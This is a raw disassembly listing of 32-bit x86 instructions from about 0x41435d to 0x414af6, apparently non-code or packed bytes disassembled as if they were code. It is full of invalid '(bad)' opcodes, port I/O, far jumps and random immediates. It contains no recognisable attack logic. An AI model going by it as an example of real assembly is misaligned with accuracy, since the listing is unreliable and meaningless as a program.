  41435d:	pusha  
  41435e:	stc    
  41435f:	pusha  
  414360:	jmp    edx
  414362:	pop    ss
  414363:	fbstp  TBYTE PTR [esi+0x5f60026f]
  414369:	fistp  DWORD PTR [eax]
  41436b:	loop   0x414384
  41436d:	fcmovnb st,st(4)
  41436f:	pop    eax
  414370:	(bad)  
  414371:	imul   BYTE PTR [eax+0x200c95a6]
  414377:	push   ds
  414378:	data16 (bad) 
  41437a:	cmp    al,BYTE PTR [ecx+0x4b]
  41437d:	or     ch,BYTE PTR [ecx]
  41437f:	jne    0x414349
  414381:	les    esp,FWORD PTR [edi+0x5f]
  414384:	jne    0x414367
  414386:	jmp    0x2064de65
  41438b:	jmp    0x4143ac
  41438d:	gs dec eax
  41438f:	mov    dh,0xf6
  414391:	or     al,BYTE PTR [ecx-0x3a]
  414394:	iret   
  414395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414396:	ret    
  414397:	and    cl,ah
  414399:	mov    dh,0x3c
  41439b:	cmp    esp,DWORD PTR [eax+0x169220f3]
  4143a1:	sbb    eax,0x36d57edd
  4143a6:	int    0x6e
  4143a8:	mov    cl,0x79
  4143aa:	outs   dx,DWORD PTR ds:[esi]
  4143ab:	bound  ebx,QWORD PTR [eax]
  4143ad:	inc    eax
  4143ae:	clc    
  4143af:	mov    BYTE PTR [ebx],ch
  4143b1:	xor    DWORD PTR [edi+edx*4+0x31],eax
  4143b5:	out    0xb1,al
  4143b7:	inc    esp
  4143b8:	retf   0xa15d
  4143bb:	xchg   esp,eax
  4143bc:	call   0xf379ef0b
  4143c1:	mov    ebx,0xb85b6e56
  4143c6:	sbb    DWORD PTR ds:0xd1cf527d,edx
  4143cc:	and    eax,0x3af95c7e
  4143d1:	fistp  WORD PTR [eax]
  4143d3:	pop    ds
  4143d4:	js     0x4143b1
  4143d6:	jns    0x41438b
  4143d8:	shr    BYTE PTR [eax],1
  4143da:	dec    ecx
  4143db:	adc    eax,0xa1ef23c0
  4143e0:	mov    cl,0xcf
  4143e2:	into   
  4143e3:	rcl    esp,1
  4143e5:	int    0x7d
  4143e7:	in     al,0x6f
  4143e9:	mov    edi,0xfba27c71
  4143ee:	cmp    al,0x5c
  4143f0:	leave  
  4143f1:	sbb    eax,0x7508bf1a
  4143f6:	xchg   esi,eax
  4143f7:	fstp   DWORD PTR [ebx]
  4143f9:	jb     0x4143bc
  4143fb:	arpl   WORD PTR [eax+0x3e],di
  4143fe:	iret   
  4143ff:	popf   
  414400:	xchg   edi,eax
  414401:	ja     0x4143d5
  414403:	je     0x4143e6
  414405:	push   eax
  414406:	pop    ecx
  414407:	pusha  
  414408:	or     al,0x6c
  41440a:	das    
  41440b:	cmp    DWORD PTR [edx-0x4b],0xfffffff0
  41440f:	sbb    al,0xb1
  414411:	lods   al,BYTE PTR ds:[esi]
  414412:	leave  
  414413:	pop    ds
  414414:	jmp    0x6db6:0x3faf497f
  41441b:	iret   
  41441c:	add    dh,bl
  41441e:	xchg   edx,eax
  41441f:	mov    ds:0x8a798da6,eax
  414424:	repz and DWORD PTR [ebp-0x53],ebx
  414428:	jno    0x4143e7
  41442a:	mov    al,ds:0xe389eace
  41442f:	dec    edi
  414430:	sar    DWORD PTR [ebx],cl
  414432:	repz xchg edi,eax
  414434:	adc    eax,0xe30ba6f8
  414439:	adc    esp,DWORD PTR [eax-0x66]
  41443c:	ins    DWORD PTR es:[edi],dx
  41443d:	xor    BYTE PTR [ebp-0x2314fe93],0x8d
  414444:	jbe    0x414447
  414446:	add    edx,DWORD PTR [ebx-0x69acc020]
  41444c:	aad    0x7e
  41444e:	aas    
  41444f:	inc    esi
  414450:	fsub   QWORD PTR [ecx-0x13]
  414453:	adc    al,BYTE PTR [esi]
  414455:	push   ecx
  414456:	dec    esi
  414457:	dec    esp
  414458:	xchg   esp,eax
  414459:	push   eax
  41445a:	mov    WORD PTR [ecx+0x3282bccf],?
  414460:	out    dx,eax
  414461:	sub    BYTE PTR [ebp-0x6a],dl
  414464:	pop    esp
  414465:	fisub  WORD PTR [edi]
  414467:	loopne 0x414454
  414469:	dec    esp
  41446a:	sub    al,0x6a
  41446c:	mov    ah,0x7b
  41446e:	inc    ecx
  41446f:	(bad)
  414472:	pushf  
  414473:	and    eax,esi
  414475:	popa   
  414476:	inc    edi
  414477:	xchg   ecx,eax
  414478:	push   ebp
  414479:	out    0x1f,eax
  41447b:	loope  0x414459
  41447d:	sub    ah,dl
  41447f:	sbb    eax,0xfd4868f2
  414484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414485:	(bad)  
  414486:	mov    ds:0xf3c3f481,eax
  41448b:	cmc    
  41448c:	pop    eax
  41448d:	(bad)  
  41448e:	cmp    ebp,DWORD PTR ds:0xd9844f55
  414494:	jns    0x414511
  414496:	sub    ecx,DWORD PTR [edx]
  414498:	aam    0xd7
  41449a:	cmp    eax,0x1d
  41449d:	fmul   QWORD PTR [ecx+0x60a1f843]
  4144a3:	scas   al,BYTE PTR es:[edi]
  4144a4:	sahf   
  4144a5:	dec    cx
  4144a7:	ins    DWORD PTR es:[edi],dx
  4144a8:	outs   dx,DWORD PTR ds:[esi]
  4144a9:	call   0x6c012725
  4144ae:	jmp    0x4144b1
  4144b0:	pop    ecx
  4144b1:	(bad)  
  4144b2:	outs   dx,DWORD PTR ds:[esi]
  4144b3:	jmp    0x20eb6696
  4144b8:	lods   eax,DWORD PTR ds:[esi]
  4144b9:	mov    ah,0x5e
  4144bb:	lock xchg ebx,eax
  4144bd:	push   ecx
  4144be:	cmp    dh,BYTE PTR ss:[eax]
  4144c1:	test   DWORD PTR [ebp+0x634bd65d],esp
  4144c7:	fsub   QWORD PTR [edi]
  4144c9:	mov    bh,0xd9
  4144cb:	fnstcw WORD PTR [ecx+0x74]
  4144ce:	mov    bh,dh
  4144d0:	rol    DWORD PTR [esi+0x3e455e29],1
  4144d6:	and    DWORD PTR ds:0xe28d9493,eax
  4144dc:	and    al,0xd2
  4144de:	jp     0x4144b5
  4144e0:	sub    edi,ecx
  4144e2:	lock mov ch,0x36
  4144e5:	jns    0x4144ad
  4144e7:	ret    
  4144e8:	mov    cl,0x91
  4144ea:	push   esi
  4144eb:	xchg   esp,eax
  4144ec:	jbe    0x414556
  4144ee:	mov    edi,0x2f3ba811
  4144f3:	sti    
  4144f4:	in     al,0x3f
  4144f6:	or     cl,bh
  4144f8:	xlat   BYTE PTR ds:[ebx]
  4144f9:	pop    edi
  4144fa:	pop    ebp
  4144fb:	ins    DWORD PTR es:[edi],dx
  4144fc:	test   al,0x46
  4144fe:	das    
  4144ff:	outs   dx,BYTE PTR ds:[esi]
  414500:	clc    
  414501:	pop    ss
  414502:	pop    es
  414503:	nop
  414504:	xchg   edx,eax
  414505:	shl    BYTE PTR [edi],0xae
  414508:	add    DWORD PTR [edx-0x77c05e4b],ecx
  41450e:	inc    ax
  414510:	xchg   edi,eax
  414511:	jo     0x41453e
  414513:	lds    ebx,FWORD PTR [eax+0x7cd49dfd]
  414519:	xchg   esp,eax
  41451a:	retf   
  41451b:	outs   dx,DWORD PTR ds:[esi]
  41451c:	adc    DWORD PTR [eax],esi
  41451e:	xlat   BYTE PTR ds:[ebx]
  41451f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414520:	sub    ecx,0xffffffa0
  414523:	jle    0x41458e
  414525:	and    ah,BYTE PTR [ebp-0x48f00f81]
  41452b:	cld    
  41452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41452d:	jae    0x4144dd
  41452f:	in     eax,dx
  414530:	push   es
  414531:	push   ds
  414532:	pop    esi
  414533:	rcl    ebp,cl
  414535:	mov    ebp,0xb23a6b28
  41453b:	inc    esi
  41453c:	clc    
  41453d:	pop    ecx
  41453e:	rcr    DWORD PTR [ebp+0x28],0x54
  414542:	or     cl,ah
  414544:	ret    0x9b6f
  414547:	and    edi,ecx
  414549:	(bad)  
  41454a:	dec    esi
  41454b:	add    cl,BYTE PTR [edi+ebx*4+0x2b3d8a73]
  414552:	add    al,BYTE PTR [ebp+0x5beda37c]
  414558:	xchg   dh,bh
  41455a:	fsub   QWORD PTR [eax]
  41455c:	outs   dx,BYTE PTR ds:[esi]
  41455d:	xchg   edi,eax
  41455e:	and    ah,cl
  414560:	outs   dx,DWORD PTR ds:[esi]
  414561:	mov    ah,0x41
  414563:	push   0x61491423
  414568:	pop    ss
  414569:	into   
  41456a:	mov    gs,WORD PTR [esi]
  41456c:	hlt    
  41456d:	shl    DWORD PTR [esi+0x2328b6da],cl
  414573:	add    ecx,DWORD PTR [edi+0x49]
  414576:	mov    eax,0x9d064d55
  41457b:	jl     0x41452e
  41457d:	lock pushf 
  41457f:	mov    WORD PTR [edi-0x129a6c3],?
  414585:	das    
  414586:	mov    bl,0xad
  414588:	add    dl,dh
  41458a:	push   ebx
  41458b:	imul   eax,DWORD PTR [edi],0x6d6eca5a
  414591:	mov    esp,0x90eecd3d
  414596:	ins    DWORD PTR es:[edi],dx
  414597:	mov    ebp,0x1fbd3c65
  41459c:	dec    esp
  41459d:	fs xchg esi,eax
  41459f:	sub    edi,DWORD PTR [esi-0x6c]
  4145a2:	dec    edx
  4145a3:	adc    DWORD PTR [edx-0x80],esi
  4145a6:	jbe    0x41458d
  4145a8:	lea    esi,[ecx+0x3022db1]
  4145ae:	bound  eax,QWORD PTR [eax+edi*4]
  4145b1:	jl     0x41459b
  4145b3:	xor    al,0x69
  4145b5:	add    eax,0xadb8d27a
  4145ba:	jne    0x41459e
  4145bc:	pop    edi
  4145bd:	stos   DWORD PTR es:[edi],eax
  4145be:	xchg   ebx,eax
  4145bf:	and    BYTE PTR [ebp-0x3e3f9d99],bl
  4145c5:	sbb    eax,0xa7515223
  4145ca:	in     eax,dx
  4145cb:	push   eax
  4145cc:	imul   edx,DWORD PTR [eax+0x10bc37d1],0xffffffb8
  4145d3:	inc    ebx
  4145d4:	stos   BYTE PTR es:[edi],al
  4145d5:	mov    bh,0x69
  4145d7:	test   DWORD PTR [eax+0x58],ebp
  4145da:	dec    ebp
  4145db:	inc    ecx
  4145dc:	fcomp  QWORD PTR [ebx-0x32]
  4145df:	push   cs
  4145e0:	jo     0x414596
  4145e2:	rcr    BYTE PTR [eax-0x2],cl
  4145e5:	ret    0x398b
  4145e8:	xor    BYTE PTR [ebp+0x7f],0x3b
  4145ec:	lahf   
  4145ed:	fdiv   QWORD PTR [ebx-0x3c]
  4145f0:	push   es
  4145f1:	out    0x9e,al
  4145f3:	inc    ecx
  4145f4:	mov    bh,dh
  4145f6:	out    0x47,al
  4145f8:	sahf   
  4145f9:	retf   0x8b
  4145fc:	jne    0x414586
  4145fe:	scas   eax,DWORD PTR es:[edi]
  4145ff:	pop    edx
  414600:	hlt    
  414601:	mov    eax,ds:0x2683d998
  414606:	jge    0x414611
  414608:	pop    DWORD PTR [esi+edi*4]
  41460b:	popa   
  41460c:	push   ss
  41460d:	stos   DWORD PTR es:[edi],eax
  41460e:	push   edx
  41460f:	je     0x414680
  414611:	or     BYTE PTR ds:[edx+0x5b],bl
  414615:	ret    
  414616:	xor    DWORD PTR [esi-0x73],ebx
  414619:	(bad)  
  41461b:	adc    eax,0xbd5df7bd
  414620:	mov    edi,0x31b95355
  414625:	xchg   ecx,eax
  414626:	sub    edi,DWORD PTR [edi-0x53]
  414629:	fsub   QWORD PTR [edx]
  41462b:	xor    eax,0xf8b53a67
  414630:	lea    ebp,[ebp+0x4250a68b]
  414636:	add    eax,0x6cd5d159
  41463b:	xchg   DWORD PTR [esi-0x73],ecx
  41463e:	rcl    DWORD PTR [eax],1
  414640:	popa   
  414641:	in     al,dx
  414642:	adc    BYTE PTR [edx],bl
  414644:	mov    dh,0xe0
  414646:	repnz mov esi,0x84f77d87
  41464c:	icebp  
  41464d:	je     0x4146a6
  41464f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414650:	xchg   ebx,eax
  414651:	mov    edi,?
  414653:	cli    
  414654:	outs   dx,BYTE PTR ds:[esi]
  414655:	aam    0xb6
  414657:	xlat   BYTE PTR ds:[ebx]
  414658:	jns    0x41463e
  41465a:	sub    ebx,DWORD PTR [edx]
  41465c:	adc    BYTE PTR [edx+0x21],al
  41465f:	imul   esp,DWORD PTR [edx+edx*4],0xffffffd5
  414663:	lahf   
  414664:	das    
  414665:	push   ss
  414666:	mov    dh,0x6c
  414668:	jg     0x41461e
  41466a:	cli    
  41466b:	pusha  
  41466c:	dec    ebp
  41466d:	in     eax,dx
  41466e:	or     eax,0x703f5305
  414673:	in     al,dx
  414674:	push   ds
  414675:	int3   
  414676:	ret    0x95f0
  414679:	cwde   
  41467a:	push   ds
  41467b:	aas    
  41467c:	xchg   edx,eax
  41467d:	mov    dl,0xa
  41467f:	call   0x8938:0x38ca3510
  414686:	jge    0x4146c2
  414688:	call   0x821fcbdd
  41468d:	push   0xffffffa1
  41468f:	pop    DWORD PTR [eax]
  414691:	int    0xcc
  414693:	ret    
  414694:	add    dl,dh
  414696:	pop    esi
  414697:	test   al,0xf3
  414699:	ins    DWORD PTR es:[edi],dx
  41469a:	fcomip st,st(5)
  41469c:	dec    ecx
  41469d:	(bad)  
  41469e:	push   esp
  41469f:	add    eax,0xbc90bfe5
  4146a4:	and    ah,BYTE PTR [ebp+0x15eeaece]
  4146aa:	pop    ss
  4146ab:	je     0x414682
  4146ad:	jo     0x4146e5
  4146af:	xor    DWORD PTR [eax],esp
  4146b1:	std    
  4146b2:	add    BYTE PTR [edx],dl
  4146b4:	xchg   edx,eax
  4146b5:	out    dx,eax
  4146b6:	push   0xe2dcdae9
  4146bb:	(bad)  
  4146bd:	cdq    
  4146be:	xchg   DWORD PTR [ecx],esp
  4146c0:	sahf   
  4146c1:	dec    ecx
  4146c2:	xor    bh,BYTE PTR [edi-0x3449aad9]
  4146c8:	inc    esi
  4146c9:	mov    ch,0x8e
  4146cb:	mov    ds:0x580d53c0,eax
  4146d0:	pop    eax
  4146d1:	and    bl,al
  4146d3:	or     DWORD PTR [esi],0xfffffff4
  4146d6:	add    ch,al
  4146d8:	fs jp  0x4146f3
  4146db:	xchg   ebx,eax
  4146dc:	adc    DWORD PTR [eax+0x3a],ebp
  4146df:	int    0x8f
  4146e1:	jb     0x4146a5
  4146e3:	adc    DWORD PTR [ebp-0x2cf70816],ebx
  4146e9:	mov    ecx,0x35325cc3
  4146ee:	mov    ebp,0xc65b08c7
  4146f3:	pop    ds
  4146f4:	(bad)  
  4146f5:	cmp    al,0x55
  4146f7:	std    
  4146f8:	xor    esp,ebx
  4146fa:	mov    ebp,0xdc02bd65
  4146ff:	out    0x55,al
  414701:	jl     0x4146eb
  414703:	daa    
  414704:	fisttp WORD PTR [ecx+ecx*4]
  414707:	inc    edi
  414708:	jb     0x4146fd
  41470a:	(bad)  
  41470b:	pop    ebx
  41470c:	adc    esp,DWORD PTR [ebp+0x3aee4163]
  414712:	and    dl,BYTE PTR [edx+0x16af2176]
  414718:	mov    ss,WORD PTR [esi-0x4d]
  41471b:	and    al,0x2b
  41471d:	inc    esp
  41471e:	jne    0x4146d9
  414720:	and    eax,0xcf5040ed
  414725:	pop    edx
  414726:	adc    eax,0x78ae6f4a
  41472b:	and    al,0x93
  41472d:	jns    0x41471f
  41472f:	test   BYTE PTR [edx-0x54e62c43],dh
  414735:	cmp    al,0x53
  414737:	or     ecx,edi
  414739:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  41473d:	or     BYTE PTR [eax],cl
  41473f:	shl    edx,0x1e
  414742:	mov    edx,DWORD PTR [esi]
  414744:	mov    ecx,DWORD PTR [esi+0x4]
  414747:	jmp    0x414cd1
  41474c:	arpl   WORD PTR [edx-0x67eb5a1b],bx
  414752:	and    esp,DWORD PTR [eax]
  414754:	stos   DWORD PTR es:[edi],eax
  414755:	sub    eax,eax
  414757:	scas   al,BYTE PTR es:[edi]
  414758:	les    eax,FWORD PTR [ecx-0x3]
  41475b:	mov    ah,0x6f
  41475d:	fisttp QWORD PTR [esi+edx*1]
  414760:	cmp    eax,0x161604
  414765:	mov    bh,0x90
  414767:	in     eax,0xde
  414769:	add    esi,eax
  41476b:	lods   eax,DWORD PTR ds:[esi]
  41476c:	daa    
  41476d:	inc    ebp
  41476e:	test   BYTE PTR [edx+esi*1+0x48],0x9b
  414773:	es retf 
  414775:	jl     0x414778
  414777:	xor    al,0x3e
  414779:	dec    ebx
  41477a:	and    BYTE PTR [ebx+0x4e],cl
  41477d:	loopne 0x414788
  41477f:	dec    ebp
  414780:	add    ch,BYTE PTR ss:[ecx+eax*2]
  414784:	fs test al,0x9c
  414787:	jmp    0xf9a1:0x277fbe35
  41478e:	nop
  41478f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414790:	jo     0x41473d
  414792:	mov    esi,DWORD PTR [esi]
  414794:	sub    ebx,ebx
  414796:	and    DWORD PTR [eax-0x7e8d7f8e],ebp
  41479c:	push   es
  41479d:	cmc    
  41479e:	push   es
  41479f:	aas    
  4147a0:	pusha  
  4147a1:	ins    BYTE PTR es:[edi],dx
  4147a2:	sbb    BYTE PTR [ebx+0x76],bl
  4147a5:	xchg   edx,eax
  4147a6:	push   ebx
  4147a7:	and    edi,DWORD PTR [ebx+eax*2-0x2c]
  4147ab:	cmp    edx,ebx
  4147ad:	add    al,0xc7
  4147af:	cwde   
  4147b0:	sbb    cl,bh
  4147b2:	not    DWORD PTR [ebp+0x24]
  4147b5:	jno    0x414762
  4147b7:	and    ch,BYTE PTR [eax]
  4147b9:	and    dl,ah
  4147bb:	and    DWORD PTR [ebx+0x5ba84086],0x5a148d1b
  4147c5:	mov    ebp,0x582bf41c
  4147ca:	ins    BYTE PTR es:[edi],dx
  4147cb:	push   ecx
  4147cc:	cwde   
  4147cd:	jo     0x4147cc
  4147cf:	pop    es
  4147d0:	cmp    al,0xdf
  4147d2:	xchg   edx,eax
  4147d3:	cdq    
  4147d4:	icebp  
  4147d5:	sbb    bl,BYTE PTR [edx+esi*8-0x6f]
  4147d9:	push   edi
  4147da:	pop    ebp
  4147db:	jbe    0x414805
  4147dd:	das    
  4147de:	rol    DWORD PTR [edi-0x2b4a453d],1
  4147e4:	in     eax,0x38
  4147e6:	into   
  4147e7:	(bad)  
  4147e9:	das    
  4147ea:	retf   0x954a
  4147ed:	js     0x414808
  4147ef:	dec    eax
  4147f0:	ror    BYTE PTR [ebx-0x1d],cl
  4147f3:	enter  0x6215,0xd9
  4147f7:	call   0x9e07:0x90684011
  4147fe:	fisttp WORD PTR [ebx]
  414800:	xor    ecx,DWORD PTR [ebp+0x6d]
  414803:	gs dec esi
  414805:	fs inc ebx
  414807:	(bad)  
  414809:	int3   
  41480a:	shr    BYTE PTR [edi],cl
  41480c:	out    0x1b,eax
  41480e:	lds    ebp,FWORD PTR [edx]
  414810:	pop    ecx
  414811:	mov    bh,0xae
  414813:	add    ch,BYTE PTR gs:[edx+0x36]
  414817:	nop
  414818:	iret   
  414819:	push   ecx
  41481a:	out    dx,eax
  41481b:	inc    eax
  41481c:	pinsrw mm1,WORD PTR [esp+edi*4-0x5f],0xa
  414822:	outs   dx,BYTE PTR ds:[esi]
  414823:	push   ss
  414824:	jo     0x414838
  414826:	mov    ds:0xb2a71280,al
  41482b:	adc    cl,BYTE PTR [edi-0x3a492daa]
  414831:	aam    0x1b
  414833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414834:	gs in  eax,0x53
  414837:	test   BYTE PTR [ecx],cl
  414839:	scas   eax,DWORD PTR es:[edi]
  41483a:	cmp    eax,DWORD PTR [esi]
  41483c:	int    0xf5
  41483e:	mov    DWORD PTR es:[esi-0x1d],ebp
  414842:	inc    ebp
  414843:	and    cl,ch
  414845:	int3   
  414846:	fimul  DWORD PTR [esi+0x5b]
  414849:	ins    DWORD PTR es:[edi],dx
  41484a:	ins    BYTE PTR es:[edi],dx
  41484b:	mov    ah,0x88
  41484d:	(bad)  
  41484e:	out    dx,al
  41484f:	fdivp  st(6),st
  414851:	jb     0x4147eb
  414853:	shl    BYTE PTR ds:[ecx],cl
  414856:	cmp    BYTE PTR [esi-0x5ce3d5b9],dl
  41485c:	nop    DWORD PTR ds:0xeea49873
  414863:	pop    ds
  414864:	call   0x976c:0x9594eaff
  41486b:	inc    eax
  41486c:	rol    BYTE PTR [eax-0x77fdd8fd],0xe7
  414873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414874:	imul   esp,esi,0x34b69948
  41487a:	popf   
  41487b:	or     BYTE PTR ds:0x2a11d0fa,cl
  414881:	mov    ah,0xcc
  414883:	mov    dl,0x56
  414885:	xor    BYTE PTR [eax-0x37e13632],dl
  41488b:	xchg   ebp,eax
  41488c:	loop   0x41486c
  41488e:	in     eax,0x3f
  414890:	xor    BYTE PTR [edi],bl
  414892:	jmp    0x4320:0x34d9393
  414899:	pop    eax
  41489a:	and    DWORD PTR [esi],ebx
  41489c:	out    dx,al
  41489d:	(bad)  
  41489f:	pusha  
  4148a0:	jbe    0x414887
  4148a2:	xchg   ebx,eax
  4148a3:	int    0xb7
  4148a5:	jecxz  0x414841
  4148a7:	cs push ebx
  4148a9:	jp     0x4148f6
  4148ab:	aas    
  4148ac:	(bad)  
  4148ae:	repnz out 0x2c,eax
  4148b1:	fadd   QWORD PTR [ebp+0x1d]
  4148b4:	add    BYTE PTR [ebx-0x16459b17],bh
  4148ba:	lea    esi,[edx-0x4435ff14]
  4148c0:	push   esp
  4148c1:	les    eax,FWORD PTR [ecx-0x7a]
  4148c4:	xchg   edi,eax
  4148c5:	or     al,0xc1
  4148c7:	lahf   
  4148c8:	out    dx,al
  4148c9:	add    eax,0x383a6cab
  4148ce:	sub    ah,BYTE PTR [edi+0x23]
  4148d1:	add    edx,DWORD PTR [ebx+edi*8]
  4148d4:	push   ebx
  4148d5:	mov    cl,0x52
  4148d7:	mov    edx,0x27622f3e
  4148dc:	dec    esi
  4148dd:	mov    DWORD PTR [esp+ecx*1+0x7],esp
  4148e1:	lea    ebp,[esi+0x5a74f347]
  4148e7:	sub    BYTE PTR [edi],bh
  4148e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ea:	adc    DWORD PTR [edi],edx
  4148ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ed:	stc    
  4148ee:	in     al,dx
  4148ef:	xchg   DWORD PTR [ecx-0x1063cfd],edx
  4148f5:	sub    eax,0x5f93b57
  4148fa:	ds ds in eax,dx
  4148fd:	leave  
  4148fe:	jle    0x414972
  414900:	xchg   esp,eax
  414901:	rcl    BYTE PTR [esi-0x7621e329],0x21
  414908:	aaa    
  414909:	sbb    al,0x3f
  41490b:	mov    esi,0xddd96221
  414910:	cmp    BYTE PTR [ecx+0x51812151],al
  414916:	ins    DWORD PTR es:[edi],dx
  414917:	pop    ecx
  414918:	icebp  
  414919:	xlat   BYTE PTR gs:[ebx]
  41491b:	call   0xf67b:0x55792f21
  414922:	test   DWORD PTR [edx+0x34f610b0],ecx
  414928:	add    esi,edi
  41492a:	call   0xc4dd3399
  41492f:	loope  0x414915
  414931:	cmp    DWORD PTR [ebp+0x46],esp
  414934:	aaa    
  414935:	js     0x414913
  414937:	dec    ebx
  414938:	sbb    al,0xb9
  41493a:	dec    ebp
  41493b:	xchg   esi,eax
  41493c:	out    dx,al
  41493d:	(bad)  
  41493e:	mov    esi,0xce54b9c3
  414943:	sar    BYTE PTR ds:0xd965c1e5,cl
  414949:	stc    
  41494a:	(bad)  
  41494b:	in     eax,0xb2
  41494d:	nop
  41494e:	or     edx,DWORD PTR [ecx-0x5d]
  414951:	mov    BYTE PTR [esi+0x1eaa18bc],ch
  414957:	ror    DWORD PTR [eax+0x44],1
  41495a:	cmp    BYTE PTR [edi+0x59],al
  41495d:	pop    edi
  41495e:	lods   al,BYTE PTR ds:[esi]
  41495f:	int    0xe2
  414961:	and    DWORD PTR [ebp-0x4e],eax
  414964:	add    al,0x2a
  414966:	mov    edi,0xb7361873
  41496b:	sub    BYTE PTR [edx+0xed79d59],dl
  414971:	adc    dh,BYTE PTR [ecx]
  414973:	es pop eax
  414975:	and    al,0x4a
  414977:	mov    ah,0x90
  414979:	lods   eax,DWORD PTR ds:[esi]
  41497a:	jbe    0x4148ff
  41497c:	sub    bl,BYTE PTR [ecx]
  41497e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41497f:	jnp    0x4149b1
  414981:	cmp    edi,DWORD PTR [ebx+0x147e4375]
  414987:	sbb    edi,DWORD PTR [eiz*8-0x3cc09edf]
  41498e:	jmp    0x1521a039
  414993:	cmp    BYTE PTR [ecx],dh
  414995:	test   eax,0xd3027028
  41499a:	inc    esp
  41499b:	mov    bh,BYTE PTR [edi+0x706cec10]
  4149a1:	lds    ebp,FWORD PTR [eax]
  4149a3:	inc    ecx
  4149a4:	jo     0x414a1a
  4149a6:	inc    edx
  4149a7:	push   cs
  4149a8:	in     al,dx
  4149a9:	jecxz  0x4149a3
  4149ab:	jle    0x414958
  4149ad:	or     eax,0x349409dd
  4149b3:	sbb    eax,0xfea92501
  4149b8:	mov    ebx,0x60b56c10
  4149bd:	jo     0x41499e
  4149bf:	add    esp,DWORD PTR [edx]
  4149c1:	mov    ah,0x99
  4149c3:	dec    ecx
  4149c4:	iret   
  4149c5:	call   0xd768:0x8b8246ab
  4149cc:	or     BYTE PTR [ebp+0x5],bl
  4149cf:	mov    ds:0x848e92e,eax
  4149d4:	push   0x6403fe96
  4149d9:	and    BYTE PTR [ecx],ah
  4149db:	mov    BYTE PTR [edi],al
  4149dd:	pop    eax
  4149de:	mov    ebp,0xd360b279
  4149e3:	or     BYTE PTR [ecx+0x19d10ae1],al
  4149e9:	xor    ah,BYTE PTR [edi]
  4149eb:	jnp    0x4149d5
  4149ed:	icebp  
  4149ee:	push   0x72
  4149f0:	icebp  
  4149f1:	pop    esp
  4149f2:	pop    ds
  4149f3:	cmp    ebx,esi
  4149f5:	rol    edi,0xd9
  4149f8:	iret   
  4149f9:	or     al,0x5d
  4149fb:	in     al,0xe2
  4149fd:	or     eax,0x3cbee311
  414a02:	loopne 0x414a5f
  414a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a05:	cmp    eax,0xc05f9897
  414a0a:	leave  
  414a0b:	div    edi
  414a0d:	in     eax,dx
  414a0e:	(bad)  
  414a0f:	shl    al,cl
  414a11:	xchg   BYTE PTR [edi],cl
  414a13:	aas    
  414a14:	cmp    cl,BYTE PTR [ebp-0x28328a97]
  414a1a:	add    dl,BYTE PTR [esi-0x31]
  414a1d:	ja     0x414a5d
  414a1f:	jo     0x414a63
  414a21:	dec    ecx
  414a22:	sbb    BYTE PTR [ebp+0x3c],cl
  414a25:	call   0x75d3:0xd8c4152a
  414a2c:	cmp    al,0xa
  414a2e:	mov    cl,0x20
  414a30:	out    dx,al
  414a31:	sbb    dh,BYTE PTR [esp+esi*2-0x76e4b506]
  414a38:	sbb    ah,al
  414a3a:	hlt    
  414a3b:	popa   
  414a3c:	jae    0x4149f8
  414a3e:	bound  esi,QWORD PTR [ebp-0x16]
  414a41:	xor    al,0x3d
  414a43:	sahf   
  414a44:	bound  edx,QWORD PTR [ecx+eax*1-0x2b]
  414a48:	ins    BYTE PTR es:[edi],dx
  414a49:	ds jp  0x414a04
  414a4c:	xor    BYTE PTR [esi],bl
  414a4e:	inc    BYTE PTR [eax-0x5a4a55c8]
  414a54:	imul   esi
  414a56:	retf   
  414a57:	and    DWORD PTR [esi+0x4d1cc5dd],ebx
  414a5d:	mov    eax,0x5b83dfe0
  414a62:	xlat   BYTE PTR ds:[ebx]
  414a63:	jl     0x414ade
  414a65:	or     dl,BYTE PTR [ebx-0x6d]
  414a68:	push   es
  414a69:	mov    bl,0xa8
  414a6b:	adc    BYTE PTR ds:0x6f232312,ch
  414a71:	and    dl,BYTE PTR [edi]
  414a73:	scas   eax,DWORD PTR es:[edi]
  414a74:	out    0x7a,al
  414a76:	std    
  414a77:	cmc    
  414a78:	and    DWORD PTR [edx+0x5e],0xffffffb2
  414a7c:	inc    esi
  414a7d:	and    al,0xbe
  414a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a80:	aas    
  414a81:	loop   0x414a47
  414a83:	mov    ds:0xda889a98,eax
  414a88:	fwait
  414a89:	retf   
  414a8a:	call   0x166d:0x7a4f9cd4
  414a91:	jmp    0x28eb:0x29233ca1
  414a98:	jno    0x414a57
  414a9a:	cmc    
  414a9b:	cmp    BYTE PTR [ebx-0x5e],al
  414a9e:	test   BYTE PTR [edx+0xc],0xa9
  414aa2:	and    BYTE PTR [ebx+0x26e08b29],dh
  414aa8:	rol    DWORD PTR [edx-0x5a],cl
  414aab:	and    esi,DWORD PTR [esi]
  414aad:	daa    
  414aae:	xchg   ebx,eax
  414aaf:	popf   
  414ab0:	test   eax,0x517b20d
  414ab5:	leave  
  414ab6:	or     BYTE PTR [ebp+ecx*1+0x2f0b397b],cl
  414abd:	(bad)  [edx-0x152ad4b7]
  414ac3:	push   edi
  414ac4:	and    BYTE PTR [ebx-0x3e4e5fc5],0x2c
  414acb:	sbb    eax,0xe44ab9e1
  414ad0:	test   eax,0x2edaee2c
  414ad5:	dec    edi
  414ad6:	popf   
  414ad7:	test   DWORD PTR [ebx+0x6d],0xc9b755cb
  414ade:	jmp    0xd95ee645
  414ae3:	clc    
  414ae4:	leave  
  414ae5:	jmp    0x414b24
  414ae7:	cmp    eax,0xe0f8092e
  414aec:	les    ebx,FWORD PTR [edx+ebp*1]
  414aef:	inc    eax
  414af0:	jae    0x414b47
  414af2:	fwait
  414af3:	pop    edi
  414af4:	push   esp
  414af5:	inc    esi
  414af6:	cdq    
